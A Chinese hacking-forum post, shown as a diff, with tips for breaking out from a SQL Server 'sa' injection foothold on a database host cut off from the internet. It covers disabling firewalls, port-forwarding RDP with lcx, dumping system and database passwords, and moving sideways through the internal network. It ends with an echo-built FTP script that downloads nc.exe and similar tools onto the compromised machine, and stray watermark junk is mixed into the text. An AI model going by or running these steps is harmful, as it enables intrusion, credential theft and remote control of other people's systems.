@@ -1,0 +1,59 @@
+ 注入SA权限分离的一些思路 
+ 
+SA点,system权限,可执行命令,web和db分离.DB机器不上网(一般指中马不上线,lcx反弹不出)
+
+一:DB机有公网IP.
+1, 执行命令把系统防火墙和ip策略停止,netstat -an找到3389端口尝试连接.
+
+2, 从内往外扫描.把命令行下的s扫描器转成vbs传上DB机器生成exe扫描外网一台做了端口策略的机器.
+   这台外网机器开放所有端口.(可以到网上找这样的机器.) 如果扫描结果有开放端口,
+   证明在这台DB机可以把3389转到外面机器.比如扫到80 那就lcx -slave ip 80 127.0.0.1 3389.
+
+3, 尽量多拿密码.用vbs的方法上传gethash,sqlsniffer类的工具.拿到系统和mssql的密码,
+   数据库表的后台管理员密码,member表的最前几个用户密码.这些密码可以用来测试web后台,
+   web的3389 ftp等.当然事先要对web机器完整扫描一遍.
+
+4, nmap扫描.用nmap扫描web和db机器的1-65535端口.如果发现db机器显示有closed的端口.那恭喜你,你可   以lcx -tran 把3389转发到该端口直接登陆.firewalk也有类似功能.但对代理防火墙无用.
+
+二:DB机只有内网IP.
+
+1,尽量多拿密码来net use到web机器.这个过程需要极大的耐心 : , 拿密码尝试登陆web后台等.
+2,停掉防火墙和IP策略再从内往外扫描.
+3,ipconfig /dispalydns如果发现有公网的域名,极大可能是路由做了手脚.机会还是有的.
+4,学会密码规律分析往往会有惊喜.
+5,在sa点里执行命令渗透内网,找可上网的机器.isql,ipc共享,wmi等
+
+有些地区或国家会禁止别的国家连接一些端口,所以拥有目标国代理或VPN是很重要的.
+
+
+遇到一猪肉 sa 能执行命令 跟web是分开的 3389开了 不给连 毛有后台
+( N; j5 s% c4 w0 {4 T; T  E90 Security Team90sec-信息安全团队7 x9 Z$ h- k  g* G
+想来想去 想到了ftp下载nc lcx wget 等杀器 捣鼓了一下 居然成功了 毛有技术含量 大牛飘过view sourceprint?01 echo open 127.0.0.1>c:\ftp.dat  
+
+02    
+
+03 echo admin>>c:\ftp.dat  
+
+04    
+
+05 echo admin>>c:\ftp.dat  
+
+06    
+
+07 echo binary>>c:\ftp.dat  
+
+08    
+
+09 echo get nc.exe>>c:\ftp.dat  
+
+10    
+
+11 echo bye>>c:\ftp.dat  
+
+12    
+
+13 ftp -s:c:\ftp.dat 
+c盘果断就出现了个nc   lcx wget 啥的 都可以 个人喜欢了 剩下的 你们懂得~
+
+
+
